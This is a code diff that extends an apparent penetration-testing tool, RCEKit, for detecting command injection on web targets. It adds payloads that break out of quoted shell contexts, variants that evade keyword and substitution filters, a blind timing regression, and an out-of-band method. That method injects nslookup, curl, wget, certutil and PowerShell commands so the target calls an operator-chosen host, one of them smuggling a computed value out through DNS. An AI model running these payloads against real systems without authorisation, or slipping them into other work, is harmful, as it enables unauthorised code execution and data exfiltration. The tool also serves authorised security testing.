@@ -8,7 +8,7 @@ import re
 import string
 import sys
 import urllib.parse
-from dataclasses import asdict, dataclass
+from dataclasses import asdict, dataclass, replace as dataclass_replace
 from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any, Dict, Iterator, List, Optional, Set, Tuple
@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.21.1"
+__version__ = "2.22.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -1681,6 +1681,42 @@ class RCEKit:
                 break
         return results
 
+    # How many times an aggregate method may answer with a further probe batch.
+    # Two is what a screen-then-measure method needs; the bound exists so a
+    # buggy method cannot drive the engine forever against a live target.
+    MAX_PROBE_ROUNDS = 3
+
+    @staticmethod
+    def _quoted_shell_carriers(carriers: List[PayloadRecord],
+                               carrier_seen: Set[Tuple[str, str]],
+                               config: Dict[str, Any]) -> List[PayloadRecord]:
+        """Extra carriers for the shell-quoted break-out contexts.
+
+        ``shell_single_quoted``/``shell_double_quoted`` are exactly the contexts
+        that fit a ``ping '<input>'`` sink -- input interpolated inside quotes,
+        which every probe built for an unquoted context fails to escape. The
+        generator has always had them, but they are not in ``default_contexts``,
+        so no record carried them and the detection engine never tried them: the
+        one sink shape they exist for was the one shape that could not be
+        detected at all. They are cheap (self-separating, so one body each).
+
+        Skipped when the operator named ``--contexts`` explicitly -- a narrowed
+        run is a deliberate choice about what to send, and widening it behind
+        the operator's back is not this function's call."""
+        if config.get("contexts_explicit"):
+            return []
+        extra: List[PayloadRecord] = []
+        for record in list(carriers):
+            if record.environment not in SHELL_CAPABLE_ENVIRONMENTS:
+                continue
+            for context in sorted(SELF_SEPARATING_CONTEXTS):
+                key = (record.environment, context)
+                if key in carrier_seen:
+                    continue
+                carrier_seen.add(key)
+                extra.append(dataclass_replace(record, context=context))
+        return extra
+
     def run_detection(self, records: Iterator[PayloadRecord], url: str,
                       methods: List[str], method: str = "GET",
                       data: Optional[str] = None, headers: Optional[List[str]] = None,
@@ -1724,6 +1760,7 @@ class RCEKit:
                 continue
             carrier_seen.add(key)
             carriers.append(record)
+        carriers.extend(self._quoted_shell_carriers(carriers, carrier_seen, config or {}))
 
         results: List[Dict[str, Any]] = []
         seen: Set[str] = set()
@@ -1736,16 +1773,40 @@ class RCEKit:
                     # decide once. Each fire's timeout is stretched past its
                     # intended delay so a genuine sleep completes instead of
                     # timing out.
+                    #
+                    # A method may answer with further probes (next_probes) once
+                    # it has seen the batch -- screening cheaply before paying
+                    # for an expensive measurement. Rounds are bounded so a
+                    # method cannot loop the engine.
                     series: List[Tuple[Probe, Observation]] = []
-                    for probe in meth.build_probes(record, rng):
-                        req_timeout = timeout + (probe.delay_s or 0.0) + 2.0
-                        status, body, elapsed = self._fire(
-                            probe.payload, url, method, data, headers, url_location,
-                            resolved_body_location, req_timeout)
-                        series.append((probe, Observation(
-                            status=status, body=body, control_body=control_body, elapsed=elapsed)))
-                        if delay:
-                            time.sleep(delay)
+                    batch = meth.build_probes(record, rng)
+                    for _round in range(self.MAX_PROBE_ROUNDS):
+                        if not batch:
+                            break
+                        for probe in batch:
+                            req_timeout = timeout + (probe.delay_s or 0.0) + 2.0
+                            status, body, elapsed = self._fire(
+                                probe.payload, url, method, data, headers, url_location,
+                                resolved_body_location, req_timeout)
+                            series.append((probe, Observation(
+                                status=status, body=body, control_body=control_body,
+                                elapsed=elapsed)))
+                            if delay:
+                                time.sleep(delay)
+                        batch = meth.next_probes(series)
+                    per_probe = meth.confirm_each(series)
+                    if per_probe is not None:
+                        for probe, verdict in per_probe:
+                            results.append({
+                                "verdict": verdict.status, "detail": verdict.evidence,
+                                "status": None, "payload": probe.payload,
+                                "method": meth.name, "tier": meth.tier,
+                                "environment": record.environment, "context": record.context,
+                                "category": "detection", "expected": probe.expected,
+                            })
+                        if max_payloads and len(results) >= max_payloads:
+                            return results
+                        continue
                     verdict = meth.confirm_series(series)
                     probe = series[-1][0] if series else Probe(payload="", expected="")
                     results.append({
@@ -2185,6 +2246,14 @@ class Probe:
     forbidden: Optional[str] = None
     followup: Optional[Dict[str, Any]] = None
     delay_s: Optional[float] = None
+    # ``expected`` is a bare number (e.g. an arithmetic result with no tag around
+    # it), so the match must be fenced by non-digit boundaries.
+    boundary: bool = False
+    # The command separator this probe broke out with, and which round of an
+    # iterative method built it. Both are bookkeeping for methods that screen
+    # cheaply before committing to an expensive measurement.
+    separator: Optional[str] = None
+    phase: str = "main"
 
 
 @dataclass
@@ -2241,6 +2310,35 @@ class DetectionMethod:
         """Decide from all of this method's probe observations at once. Only
         called for methods with ``aggregate = True``."""
         raise NotImplementedError
+
+    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
+                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
+        """Optional per-probe verdicts for an ``aggregate`` method.
+
+        Some methods must observe the whole batch before judging *any* probe —
+        an out-of-band callback can land long after the response that triggered
+        it — yet still have a per-probe answer to give, because each probe
+        carries its own token. Returning a list here makes the engine emit one
+        result per probe instead of a single series verdict, so the report names
+        the exact payload that worked rather than an arbitrary one. Returning
+        ``None`` (the default) keeps the single-verdict behaviour."""
+        return None
+
+    def next_probes(self, series: "List[Tuple[Probe, Observation]]") -> List[Probe]:
+        """Probes to fire after seeing ``series``, or ``[]`` when done.
+
+        Lets an aggregate method screen cheaply before committing to an
+        expensive measurement: a timing regression costs a sleep per probe, so
+        finding *which* separator breaks out with one quick probe each beats
+        running the full regression through every candidate."""
+        return []
+
+    def _depth(self) -> str:
+        """``quick`` (canonical probes only) or ``full`` (the extended
+        vocabulary as well). Extra probe shapes buy coverage on filtered sinks
+        at the cost of more requests, so the operator can trade one for the
+        other."""
+        return self.config.get("probe_depth") or "full"
 
     def _search(self, literal: str, body: str, boundary: bool = False) -> bool:
         """Encoded-aware literal search. Reuse the generator's ``_encoded_search``
@@ -2324,7 +2422,7 @@ class DetectionMethod:
                     or record.context in SELF_SEPARATING_CONTEXTS)
 
     def _wrap_variants(self, record: "PayloadRecord", core: str, windows: bool = False,
-                       evade: bool = True) -> List[str]:
+                       evade: bool = True, terminate: bool = False) -> List[str]:
         """One ready-to-send payload per candidate separator: break out of the
         running command, then escape for the record's serialization context —
         reusing the same context/escape machinery the generator uses for every
@@ -2337,6 +2435,20 @@ class DetectionMethod:
         minimal, not aggressive/noisy evasion. Callers whose command uses a
         redirect (``>``) pass ``evade=False``: ``${IFS}`` around ``>`` yields an
         ambiguous redirect, so those stay canonical."""
+        if terminate:
+            # A trailing '#' comments out whatever the application appends after
+            # the injection point. That suffix is not exotic: `ping <input> -w 5`,
+            # `convert <input> out.png` and `<cmd> <input> 2>/dev/null` all bolt
+            # something on, and a redirect or a pipe there swallows the probe's
+            # output entirely -- the probe executes and still reads as negative.
+            #
+            # Only for an unquoted Unix context: cmd.exe has no '#' comment, and
+            # a context that closes with its own suffix would put the suffix
+            # after the '#' and comment it out instead.
+            ctx = self.gen.contexts.get(record.context, {})
+            if windows or ctx.get("suffix"):
+                return []
+            core = f"{core} #"
         if self._needs_separator(record):
             bodies = [f"{separator}{core}" for separator in self._separators(windows)]
         else:
@@ -2409,10 +2521,51 @@ class ReflectedMath(DetectionMethod):
             core_bt = f"echo {t1}{bt}{t2}"
             probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=bt)
                           for payload in self._wrap_variants(record, core_bt))
+            if self._depth() != "quick":
+                probes.extend(self._extended_probes(record, a, b, total, t1, t2, t3, core))
+        return probes
+
+    def _extended_probes(self, record: "PayloadRecord", a: int, b: int, total: int,
+                         t1: str, t2: str, t3: str, core: str) -> List[Probe]:
+        """Probe shapes for sinks the two canonical ones cannot reach.
+
+        Both canonical probes route the arithmetic through a command
+        substitution — ``$((...))`` and a backtick — and both spell the command
+        ``echo``/``expr``. That is two blind spots at once, and each is a filter
+        seen in the wild:
+
+        * a sink that strips ``$(`` blocks ``$((`` too (it is a prefix of it) and
+          also blocks the backtick, so a target exploitable through a plain
+          ``;`` reports clean. ``awk`` and a bare ``expr`` print the result
+          straight to stdout, needing no substitution at all.
+        * a keyword filter on ``echo``/``expr``/``cat``/``id`` blocks both, while
+          ``awk`` is not in anyone's blocklist.
+
+        The bare ``expr`` probe's output is an untagged number, so its match is
+        digit-fenced; the control differential still applies, exactly as for the
+        tagged probes."""
+        probes: List[Probe] = []
+        # Substitution-free and keyword-diverse. awk's concatenation binds looser
+        # than '+', so `"T1" a+b "T2"` prints T1<sum>T2.
+        core_awk = "awk 'BEGIN{print \"%s\" %d+%d \"%s\"}'" % (t1, a, b, t2)
+        awk_literal = f"{a}+{b}"
+        probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=awk_literal)
+                      for payload in self._wrap_variants(record, core_awk))
+        core_expr = f"expr {a} + {b}"
+        probes.extend(Probe(payload=payload, expected=str(total), forbidden=f"{a} + {b}",
+                            boundary=True)
+                      for payload in self._wrap_variants(record, core_expr))
+        # Comment-terminated: same proofs, but with whatever the application
+        # appends after the injection point commented out.
+        for terminated, expected, literal in (
+                (core, f"{t1}{total}{t2}{t3}{t1}", f"$(({a}+{b}))"),
+                (core_awk, f"{t1}{total}{t2}", awk_literal)):
+            probes.extend(Probe(payload=payload, expected=expected, forbidden=literal)
+                          for payload in self._wrap_variants(record, terminated, terminate=True))
         return probes
 
     def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
-        return self._confirm_computed(obs, probe)
+        return self._confirm_computed(obs, probe, boundary=probe.boundary)
 
 
 class FileBased(DetectionMethod):
@@ -2480,10 +2633,25 @@ class FileBased(DetectionMethod):
 class ParametricTime(DetectionMethod):
     """Hardened blind timing. Instead of a single margin over one slow response,
     fire a controlled series of delays (``d ∈ {0, N, 2N}``, each repeated) and
-    require the response time to track the injected delay **linearly** — a
-    monotonic increase whose extra latency at each step matches the intended
-    sleep within a noise margin. Jitter cannot fake a linear response to a
-    controlled delay.
+    require the response time to track the injected delay — a slope of about one
+    second of latency per injected second. Jitter cannot fake that.
+
+    Two confounds the naive version of this gets wrong, both handled here:
+
+    * **Which separator breaks out.** A regression blends every probe into one
+      measurement, so it cannot sweep separators the way the results-based
+      methods do — mixing a working break-out with broken ones destroys the
+      signal. Firing a full regression through *every* candidate separator costs
+      a sleep per probe per separator, which is why this screens first: one cheap
+      probe per separator, then the regression through whichever one actually
+      delayed.
+    * **Latency drift.** Probes fired in ascending delay order make the injected
+      delay collinear with the request index, so a target that simply gets slower
+      during the run — progressive load, a rate limiter backing off, a filling
+      log — produces a textbook-perfect linear fit while being entirely
+      un-injectable. The order is randomised *and* the request index enters the
+      model as a nuisance term, so drift loads onto the drift coefficient rather
+      than masquerading as a sleep.
 
     Timing has no value the target *computed*, so by design this never confirms
     on its own — its ceiling is ``needs-review``. Pair it with ``--methods
@@ -2492,55 +2660,152 @@ class ParametricTime(DetectionMethod):
     name = "time"
     tier = "needs-review"
     aggregate = True
+    # Per-carrier state, set by build_probes before next_probes/confirm_series
+    # ever run. Declared here so a partially-driven instance is still coherent.
+    _record: Optional["PayloadRecord"] = None
+    _rng: Optional["random.Random"] = None
+    _separator: Optional[str] = None
 
     def applicable(self, record: "PayloadRecord") -> bool:
         return record.environment in SHELL_CAPABLE_ENVIRONMENTS
 
+    def _sleep_core(self, delay: float, windows: bool) -> str:
+        if windows:
+            # `ping -n k` waits ~(k-1)s; +1 so d=0 is a single instant ping.
+            return f"ping 127.0.0.1 -n {int(round(delay)) + 1} >nul"
+        return f"sleep {delay:g}"
+
     def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        """Round one: screen the separators. One probe at delay 0 and one at the
+        base delay per candidate separator, so the expensive regression is only
+        ever run through a break-out that demonstrably reached a shell."""
+        self._record = record
+        self._rng = rng
         base = float(self.config.get("time_base", 2.0))
-        repeats = max(1, int(self.config.get("time_repeats", 2)))
         windows = record.environment == "windows"
+        separators = (self._separators(windows) if self._needs_separator(record) else (None,))
+        if self._depth() == "quick":
+            separators = separators[:1]
+        probes = [Probe(payload=self._payload(record, 0.0, sep, windows), expected="",
+                        delay_s=0.0, separator=sep, phase="screen")
+                  for sep in separators]
+        probes += [Probe(payload=self._payload(record, base, sep, windows), expected="",
+                         delay_s=base, separator=sep, phase="screen")
+                   for sep in separators]
+        rng.shuffle(probes)
+        return probes
+
+    def _payload(self, record: "PayloadRecord", delay: float, separator: Optional[str],
+                 windows: bool) -> str:
+        body = self._sleep_core(delay, windows)
+        if separator is not None:
+            body = f"{separator}{body}"
+        # Same low-touch transform, applied to the whole body (separator
+        # included) exactly as _wrap_variants does it, so the two paths cannot
+        # drift apart.
+        if self.config.get("evade") == "low" and not windows:
+            body = body.replace(" ", "${IFS}")
+        return self._wrap_context(record, body)
+
+    def next_probes(self, series: "List[Tuple[Probe, Observation]]") -> List[Probe]:
+        """Round two: the full regression, through the separator that delayed
+        most in the screen. Returns ``[]`` when no separator delayed (nothing to
+        measure) or once the regression has already been fired."""
+        if any(probe.phase == "regress" for probe, _ in series):
+            return []
+        base = float(self.config.get("time_base", 2.0))
+        repeats = max(1, int(self.config.get("time_repeats", 3)))
+        windows = self._record.environment == "windows"
+        quick = {}
+        slow = {}
+        for probe, obs in series:
+            if obs.status is None:
+                continue
+            (quick if (probe.delay_s or 0.0) == 0.0 else slow)[probe.separator] = obs.elapsed
+        # A separator worked if its delayed probe cleared its own zero-delay
+        # probe by most of the injected delay. Requiring the *pair* keeps a
+        # uniformly slow endpoint from looking like a break-out.
+        gains = {sep: slow[sep] - quick.get(sep, 0.0) for sep in slow if sep in quick}
+        candidates = [sep for sep, gain in gains.items() if gain >= 0.6 * base]
+        if not candidates:
+            return []
+        best = max(candidates, key=lambda sep: gains[sep])
+        self._separator = best
         probes: List[Probe] = []
         for multiplier in (0, 1, 2):
             delay = base * multiplier
             for _ in range(repeats):
-                if windows:
-                    # `ping -n k` waits ~(k-1)s; +1 so d=0 is a single instant ping.
-                    core = f"ping 127.0.0.1 -n {int(round(delay)) + 1} >nul"
-                else:
-                    core = f"sleep {delay:g}"
-                probes.append(Probe(payload=self._wrap(record, core, windows=windows),
-                                    expected="", delay_s=delay))
+                probes.append(Probe(payload=self._payload(self._record, delay, best, windows),
+                                    expected="", delay_s=delay, separator=best, phase="regress"))
+        # Randomise the fire order so the injected delay is decorrelated from the
+        # request index, which is what makes the drift term below identifiable.
+        self._rng.shuffle(probes)
         return probes
 
     def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
-        import statistics
-        if any(obs.status is None for _, obs in series):
+        regression = [(p, o) for p, o in series if p.phase == "regress"]
+        if not regression:
+            screened = ", ".join(
+                f"{(p.separator or 'bare').strip() or 'newline'}={o.elapsed:.2f}s"
+                for p, o in series if (p.delay_s or 0.0) > 0)
+            if any(o.status is None for _, o in series):
+                return Verdict("error", "one or more timing probes never reached the target "
+                                        "(delivery/TLS failure); regression not judged")
+            return Verdict("negative",
+                           f"no command separator produced a delay, so no regression was run "
+                           f"({screened or 'no samples'})")
+        if any(obs.status is None for _, obs in regression):
             return Verdict("error", "one or more timing probes never reached the target "
                                     "(delivery/TLS failure); regression not judged")
-        by_delay: Dict[float, List[float]] = {}
-        for probe, obs in series:
-            by_delay.setdefault(probe.delay_s or 0.0, []).append(obs.elapsed)
-        delays = sorted(by_delay)
-        if len(delays) < 2:
+
+        delays = [p.delay_s or 0.0 for p, _ in regression]
+        elapsed = [o.elapsed for _, o in regression]
+        index = [float(i) for i in range(len(regression))]
+        n = len(regression)
+        if n < 4 or len(set(delays)) < 2:
             return Verdict("negative", "insufficient timing samples for a regression")
-        median = {d: statistics.median(samples) for d, samples in by_delay.items()}
-        baseline = median[delays[0]]
-        spread0 = max(by_delay[delays[0]]) - min(by_delay[delays[0]])
-        noise = max(0.15, 3 * spread0)
-        summary = ", ".join(f"d={d:g}s→{median[d]:.2f}s" for d in delays)
-        previous = baseline
-        for delay in delays[1:]:
-            extra = median[delay] - baseline
-            tolerance = max(0.4, noise, 0.5 * delay)
-            if median[delay] <= previous:
-                return Verdict("negative", f"response time not monotonic in the delay ({summary})")
-            if abs(extra - delay) > tolerance:
-                return Verdict("negative", f"response time does not track the delay ({summary})")
-            previous = median[delay]
+
+        # Least squares for elapsed ~ intercept + b_delay*delay + b_drift*index.
+        # Two predictors and a constant, solved in closed form -- no third-party
+        # dependency, and cheap enough to be irrelevant next to the sleeps.
+        mean_d = sum(delays) / n
+        mean_i = sum(index) / n
+        mean_e = sum(elapsed) / n
+        cd = [x - mean_d for x in delays]
+        ci = [x - mean_i for x in index]
+        ce = [x - mean_e for x in elapsed]
+        s_dd = sum(x * x for x in cd)
+        s_ii = sum(x * x for x in ci)
+        s_di = sum(x * y for x, y in zip(cd, ci))
+        s_de = sum(x * y for x, y in zip(cd, ce))
+        s_ie = sum(x * y for x, y in zip(ci, ce))
+        det = s_dd * s_ii - s_di * s_di
+        if det <= 0:
+            return Verdict("negative",
+                           "timing design degenerate (delay and request order collinear)")
+        b_delay = (s_de * s_ii - s_ie * s_di) / det
+        b_drift = (s_ie * s_dd - s_de * s_di) / det
+        intercept = mean_e - b_delay * mean_d - b_drift * mean_i
+        residuals = [e - (intercept + b_delay * d + b_drift * i)
+                     for e, d, i in zip(elapsed, delays, index)]
+        sigma = (sum(r * r for r in residuals) / max(1, n - 3)) ** 0.5
+        stderr_delay = sigma * (s_ii / det) ** 0.5
+
+        sep = (self._separator or "bare").strip() or "newline"
+        observed = ", ".join(f"d={d:g}s→{e:.2f}s" for d, e in sorted(zip(delays, elapsed)))
+        summary = (f"{observed} | slope {b_delay:.2f}s per injected second, "
+                   f"drift {b_drift:+.2f}s per request, separator {sep!r}")
+        # A real sleep moves the response one second per injected second.
+        if not 0.6 <= b_delay <= 1.4:
+            return Verdict("negative", f"response time does not track the delay ({summary})")
+        # ...and the delay term has to stand clear of the residual noise, or the
+        # slope is an artefact of a handful of jittery samples.
+        if stderr_delay > 0 and b_delay < 3 * stderr_delay:
+            return Verdict("negative", f"delay term not separable from noise ({summary})")
         return Verdict("needs-review",
-                       f"response time tracks the controlled delay linearly ({summary}); blind timing "
-                       "candidate — pair with --methods reflected for an execution proof")
+                       f"response time tracks the controlled delay with drift modelled out "
+                       f"({summary}); blind timing candidate — pair with --methods reflected "
+                       "for an execution proof")
 
 
 class EvalExpr(DetectionMethod):
@@ -2589,6 +2854,182 @@ class EvalExpr(DetectionMethod):
         return self._confirm_computed(obs, probe, boundary=True)
 
 
+class OobCallback(DetectionMethod):
+    """Out-of-band confirmation for a target that returns nothing at all.
+
+    A fully blind sink -- no command output in the response, no writable web
+    root -- had no path to a ``confirmed`` verdict: ``time`` tops out at
+    ``needs-review`` by design, and ``file`` needs somewhere to write that the
+    target also serves. This closes that gap by making the target reach *out*.
+
+    Each probe carries its own random token and asks the target to resolve or
+    fetch ``<token>.<oob-host>``; RCEKit's own listener (HTTP + DNS, started in
+    process) records what arrives and correlates it back to the payload. A
+    callback carrying a token the target could only have learned by running the
+    command is proof of execution -- the same "the target produced something it
+    could not have echoed" invariant the results-based methods use.
+
+    The DNS probes matter more than the HTTP ones: egress filtering that blocks
+    outbound HTTP usually still lets the resolver out, and a resolver-only path
+    is often the only channel a hardened target has. One probe goes further and
+    exfiltrates a *computed* value in the label -- ``$((a+b)).<token>....`` --
+    so the callback proves the shell evaluated arithmetic, not merely that a
+    hostname was resolved.
+
+    Requires ``--oob-host``: an address the *target* can reach that resolves (or
+    is delegated) to this listener. It makes the target open outbound
+    connections, so it never runs unless the operator names that host."""
+    name = "oob"
+    tier = "confirmed"
+    # The callbacks are asynchronous -- one can land well after the response
+    # that triggered it -- so no probe can be judged until the whole batch has
+    # been fired and the listener has been given time to collect.
+    aggregate = True
+
+    # token -> which probe shape produced it, and the value a computed-label
+    # probe asked the target to evaluate. Reporting detail only.
+    _shape: Dict[str, str] = {}
+    _computed: Optional[int] = None
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        if not self.config.get("oob_host"):
+            return False
+        return record.environment in SHELL_CAPABLE_ENVIRONMENTS
+
+    def _token(self, rng: "random.Random") -> str:
+        # Lowercase letters and digits only: a DNS label is case-insensitive and
+        # the listener correlates case-folded, so a mixed-case token would only
+        # invite a 0x20-encoding resolver to mangle the comparison.
+        return "rk" + "".join(rng.choice(string.ascii_lowercase + string.digits)
+                              for _ in range(10))
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        host = str(self.config["oob_host"]).strip().rstrip(".")
+        http_port = int(self.config.get("oob_http_port") or 80)
+        windows = record.environment == "windows"
+        port_suffix = "" if http_port == 80 else f":{http_port}"
+        # A bare IP cannot carry a token as a DNS label -- there is nothing to
+        # delegate and `<token>.10.0.0.1` resolves nowhere -- so the token rides
+        # in the URL path instead, and the DNS shapes are skipped rather than
+        # sent as probes that could never call back.
+        ip_host = self._is_ip_literal(host)
+        probes: List[Probe] = []
+        # Per-instance, so probes built for one carrier do not inherit another's
+        # bookkeeping through the class attribute.
+        self._shape = dict(self._shape)
+
+        listener = self.config.get("oob_listener")
+
+        separators = (self._separators(windows) if self._needs_separator(record) else (None,))
+
+        def add(core_for_token, label: str):
+            # A token per *separator*, not per shape. Sharing one token across
+            # break-outs would mark every separator confirmed as soon as any one
+            # of them called back -- and `cmd || curl` never runs when cmd
+            # succeeds, so the report would name payloads that did nothing.
+            for separator in separators:
+                token = self._token(rng)
+                core = core_for_token(token)
+                body = core if separator is None else f"{separator}{core}"
+                payload = self._wrap_context(record, body)
+                probes.append(Probe(payload=payload, expected=token, separator=separator))
+                self._shape[token] = label
+                # Register the token with the listener, which correlates an
+                # incoming callback by looking for a known token in the requested
+                # host/path. Without this the hit arrives unattributable.
+                if listener is not None:
+                    listener.tokens[token] = {
+                        "payload": payload, "category": "detection",
+                        "context": record.context,
+                    }
+
+        def url_for(token: str) -> str:
+            authority = host if ip_host else f"{token}.{host}"
+            return f"http://{authority}{port_suffix}/{token}"
+
+        if windows:
+            if not ip_host:
+                add(lambda t: f"nslookup {t}.{host}", "dns/nslookup")
+            add(lambda t: f"certutil -urlcache -f {url_for(t)} %TEMP%\\{t}", "http/certutil")
+            add(lambda t: f"powershell -c \"iwr -useb {url_for(t)}\"", "http/powershell")
+        else:
+            if not ip_host:
+                # DNS first: the resolver is the channel most likely to be open
+                # when outbound HTTP is not.
+                add(lambda t: f"nslookup {t}.{host}", "dns/nslookup")
+                add(lambda t: f"host {t}.{host}", "dns/host")
+                if self._depth() != "quick":
+                    add(lambda t: f"ping -c 1 {t}.{host}", "dns/ping")
+                    # Computed value in the label: the callback then proves the
+                    # shell evaluated arithmetic, not merely that something
+                    # resolved a name it was handed.
+                    a, b = rng.randint(1000, 9999), rng.randint(1000, 9999)
+                    self._computed = a + b
+                    add(lambda t: f"nslookup $(({a}+{b})).{t}.{host}", "dns/computed")
+            add(lambda t: f"curl -s {url_for(t)}", "http/curl")
+            if self._depth() != "quick":
+                add(lambda t: f"wget -q -O- {url_for(t)}", "http/wget")
+        return probes
+
+    @staticmethod
+    def _is_ip_literal(host: str) -> bool:
+        """Whether ``host`` is an address literal rather than a name. Only a
+        name can carry a per-probe token as a DNS label."""
+        if host.startswith("[") or ":" in host:
+            return True  # IPv6 literal
+        octets = host.split(".")
+        return (len(octets) == 4
+                and all(o.isascii() and o.isdigit() and int(o) < 256 for o in octets))
+
+    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
+                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
+        """Wait for callbacks, then judge each probe by whether its own token
+        arrived. Per-probe rather than one series verdict, so the report names
+        the payload that actually reached the listener."""
+        import time
+        listener = self.config.get("oob_listener")
+        wait = float(self.config.get("oob_wait", 6.0))
+        out: List[Tuple[Probe, Verdict]] = []
+        if listener is None:
+            return [(probe, Verdict("error", "no OOB listener was started"))
+                    for probe, _ in series]
+        deadline = time.time() + wait
+        wanted = {probe.expected for probe, _ in series}
+        while time.time() < deadline:
+            if wanted <= {hit.get("token") for hit in listener.hits}:
+                break
+            time.sleep(0.25)
+        received = {}
+        for hit in listener.hits:
+            received.setdefault(hit.get("token"), hit)
+        for probe, obs in series:
+            hit = received.get(probe.expected)
+            if hit:
+                shape = self._shape.get(probe.expected, "callback")
+                detail = (f"target called back to the listener over {hit.get('proto')} "
+                          f"carrying token {probe.expected!r} ({shape}) — execution proven "
+                          "out of band")
+                computed = getattr(self, "_computed", None)
+                if computed is not None and str(computed) in (hit.get("host") or ""):
+                    detail += f"; the callback label carries the computed value {computed}"
+                out.append((probe, Verdict("confirmed", detail)))
+            elif obs.status is None:
+                out.append((probe, Verdict("error",
+                                           f"request never reached the target ({obs.body[:120]})")))
+            else:
+                out.append((probe, Verdict("negative", "no callback for this probe's token")))
+        return out
+
+    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
+        # confirm_each carries the real logic; this only runs if an engine calls
+        # the series form, and must agree with it.
+        each = self.confirm_each(series) or []
+        confirmed = [v for _, v in each if v.status == "confirmed"]
+        if confirmed:
+            return confirmed[0]
+        return Verdict("negative", "no out-of-band callback received for any probe")
+
+
 # The detection methods RCEKit can run, keyed by their --methods name. Adding a
 # phase = adding a class above and an entry here.
 DETECTION_METHODS = {
@@ -2596,6 +3037,7 @@ DETECTION_METHODS = {
     FileBased.name: FileBased,
     ParametricTime.name: ParametricTime,
     EvalExpr.name: EvalExpr,
+    OobCallback.name: OobCallback,
 }
 
 
@@ -2979,12 +3421,27 @@ def main():
                              "write a newline as \\n. Narrow it (e.g. --separators '; ') to cut the "
                              "request count when the sink's shape is already known. Ignored with "
                              "--sink-raw, which sends bare commands.")
+    parser.add_argument("--probe-depth", choices=["quick", "full"], default="full",
+                        help="(--methods) How many probe shapes to try per sink. 'full' (default) also "
+                             "sends the substitution-free (awk / bare expr) and comment-terminated "
+                             "variants, which reach sinks that strip '$(' and backticks, filter command "
+                             "words, or append a redirect after the injection point — roughly twice the "
+                             "requests. 'quick' sends only the canonical probes, for rate-limited targets "
+                             "or when the sink's shape is already known.")
+    parser.add_argument("--oob-host", default=None,
+                        help="(--methods oob) Host the TARGET should call back to, e.g. an IP it can "
+                             "reach or a domain delegated to this listener. Required for --methods oob, "
+                             "which starts the built-in HTTP+DNS listener and confirms execution from "
+                             "the callback. Makes the target open outbound connections, so it never runs "
+                             "unless you name the host.")
     parser.add_argument("--methods", default=None,
                         help="Comma-separated RCE detection methods to run against --verify-url/-r instead of "
                              "the classic per-payload oracle. Available: reflected (results-based execution "
                              "proof via computed arithmetic); eval (SSTI/SpEL/OGNL/Groovy/raw-eval via a "
                              "computed product); file (self-OOB write+fetch, needs --webroot and "
-                             "--web-base-url); time (hardened blind-timing regression, needs-review only). "
+                             "--web-base-url); oob (DNS/HTTP callback to the built-in listener, needs "
+                             "--oob-host — the only confirmed-tier method for a fully blind sink); "
+                             "time (hardened blind-timing regression, needs-review only). "
                              "Opt-in and additive: when omitted, verification keeps its existing behaviour "
                              "unchanged.")
     parser.add_argument("--verify-chain", default=None,
@@ -3325,7 +3782,29 @@ def main():
                 return 1
             detection_config = {"webroot": args.webroot, "web_base_url": args.web_base_url,
                                 "time_base": args.time_base, "evade": args.evade,
-                                "sink_raw": sink_raw, "separators": separators}
+                                "sink_raw": sink_raw, "separators": separators,
+                                "probe_depth": args.probe_depth,
+                                "contexts_explicit": bool(selected_contexts),
+                                "oob_host": args.oob_host,
+                                "oob_http_port": args.listen_http_port}
+            if OobCallback.name in method_names:
+                if not args.oob_host:
+                    print("[!] --methods oob makes the TARGET call back to a listener, so it needs "
+                          "--oob-host: an address the target can reach that arrives here (an IP on "
+                          "a routable interface, or a domain delegated to this host).")
+                    return 1
+                listener = OOBListener(answer_ip=args.listen_answer_ip, log_path=args.listen_log)
+                try:
+                    listener.start_http(args.listen_http_port)
+                except OSError as exc:
+                    print(f"[!] OOB listener could not bind HTTP port {args.listen_http_port}: {exc}")
+                    return 1
+                dns_up = listener.start_dns(args.listen_dns_port)
+                detection_config["oob_listener"] = listener
+                print(f"[detect] OOB listener up on HTTP :{args.listen_http_port}"
+                      f"{f', DNS :{args.listen_dns_port}' if dns_up else ' (DNS port unavailable)'}; "
+                      f"probes call back to {args.oob_host}. The target will open outbound "
+                      "connections.")
             if "file" in method_names:
                 if not (args.webroot and args.web_base_url):
                     print("[!] --methods file writes a file to the target and fetches it back, so it "
